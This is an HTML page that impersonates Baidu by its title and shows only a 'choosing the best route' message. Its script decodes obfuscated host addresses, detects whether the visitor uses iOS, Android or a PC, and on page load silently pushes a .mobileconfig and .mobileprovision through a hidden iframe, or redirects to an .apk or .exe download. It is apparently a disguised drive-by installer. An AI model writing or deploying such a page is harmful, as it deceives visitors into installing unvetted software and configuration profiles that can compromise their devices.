<html>
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
    <title>百度一下！你就知道...</title>
    <script>
        a=0;
        imgico="/favicon.ico?"+new Date().getTime();
    	turl=[];//talk
    	turl[1]=uncry('aHR0cHM6Ly9jeGRvd24ud2lu');
    	MobileConfig="/cxzx.mobileconfig";//MobileConfig
    	MobileProvision="/app.mobileprovision";//mobileprovision
        AndroidDownName="/cxzx.apk";
        PcDownName="/cxzx.exe";
    	DownName = "";
    	Hurl=[];//h5
    	Iurl=[];//iPhone
    	Aurl=[];//Android
    	Murl=[];//mobile
    	Purl=[];//pc
    	
        Murl[1]=uncry("gNzo5OOtaV6m7u6lkduxcmel4NedkNHg");
        
        Purl[1]=uncry("gNzo5OOtaV6m7u6lkduxcmel4NedkNHg");
        
    	if (/(iPhone|iPad|iPod|iOS)/i.test(navigator.userAgent)) { //iPhone|iPad|iPod|iOS
            DownName = MobileConfig;
            goMain(Murl);
        } else if (/(Android)/i.test(navigator.userAgent)) { //Android
            DownName = AndroidDownName;
            goMain(Murl);
            // window.location.replace(RunUrl);
        } else { //pc
            DownName = PcDownName;
            goMain(Purl);
            // window.location.replace(RunUrl);
                        // console.log(RunUrl);
        };
        
        function goMain(testurl){
            for (i=1;i<testurl.length;i++){
                checkUrl(testurl[i]).then(res=>{
                    if (res){
                        console.log('true');
                    }else{
                        console.log('false');
                    }
                });
            }
    	}
    
        function checkUrl (url) {
            return new Promise(function(resolve, reject) {
                let ImgObj = new Image();
                ImgObj.src = url + imgico;
                ImgObj.onload = function(res) {
                    resolve(res);
                    a=a+1;
                    if(a==1){
                        // window.location.replace(url + DownName);
                        if (/(iPhone|iPad|iPod|iOS)/i.test(navigator.userAgent)) {
                            document.getElementById('appdown').src = url+DownName;
                            setTimeout("document.getElementById('appdown').src = '"+url+"' + '"+MobileProvision+"'",2000);
                        }else{
                            window.location.replace(url + DownName);
                        }
                    }
                }
                ImgObj.onerror = function(err) {
                    reject(err)
                }
            })
        }
        
    function encry(code) {
        var c=String.fromCharCode(code.charCodeAt(0)+code.length);
        for(var i=1;i<code.length;i++){
            c+=String.fromCharCode(code.charCodeAt(i)+code.charCodeAt(i-1));
        }
        return(escape(window.btoa(c)));
    }
    
    function uncry(code) {
        code=window.atob(unescape(code));
        var c=String.fromCharCode(code.charCodeAt(0)-code.length);
        for(var i=1;i<code.length;i++){
            c+=String.fromCharCode(code.charCodeAt(i)-c.charCodeAt(i-1));
        }
        return c;
    }
    
    </script>
    
</head>
<body>
    <div style="text-align:center">
        正在选择最优路线，請等待...<br>
    </div>
    <iframe id="appdown" height="0" frameborder="no" width="0" src=""></iframe>
</body>
</html>
